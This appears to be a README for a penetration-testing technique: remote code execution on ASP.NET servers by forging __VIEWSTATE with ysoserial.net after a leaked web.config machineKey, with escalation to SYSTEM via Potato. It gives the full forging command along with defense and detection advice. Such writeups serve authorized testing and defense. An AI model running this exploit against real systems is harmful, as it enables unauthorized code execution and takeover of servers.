# ASP.NET ViewState RCE from a leaked machineKey

Full writeup: [jperezduerto.info/techniques/aspnet-viewstate-machinekey-rce](https://jperezduerto.info/techniques/aspnet-viewstate-machinekey-rce/)

ViewState is tamper-proof only because of a secret `machineKey` in `web.config`.
If you can read that `web.config` and it carries a static `machineKey`, you
forge your own `__VIEWSTATE` with ysoserial.net and the server deserializes it,
running your command as the IIS app pool on any `.aspx` page. ysoserial.net is
referenced, not carried. `viewstate-cmd.py` assembles the exact ysoserial.net
command from a `web.config` and a page (it builds the command only; it executes
nothing).

## Find

ASP.NET/IIS (`.aspx`, `__VIEWSTATE`, `Server: Microsoft-IIS`) plus a way to read
`web.config` (traversal, LFI, backup) that contains a static `<machineKey>`.

## Forge

```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell -e <b64>" \
  --generator="<__VIEWSTATEGENERATOR>" \
  --validationkey="<validationKey>" --validationalg="SHA1" \
  --decryptionkey="<decryptionKey>" --decryptionalg="AES"
# POST as __VIEWSTATE to any .aspx -> runs as the app pool
```

Generator must match the page. Land as the app pool (usually `SeImpersonate` ->
Potato to SYSTEM; see the windows-local-privesc and tcb writeups).

## Defense

Never ship a static machineKey (auto-generate per machine / `IsolateApps`,
keep out of source control); rotate on exposure; fix the LFI/traversal/backup
that disclosed `web.config`; keep ViewState MAC on with modern algorithms and
the app pool least-privileged.

## Detection

`w3wp.exe` spawning `powershell`/`cmd`/`csc`; ViewState MAC validation failures;
oversized `__VIEWSTATE` POSTs; ViewState from clients that never loaded the page.

## Use

Authorized and educational use only: your own systems, a lab you control, or an
engagement with written permission.
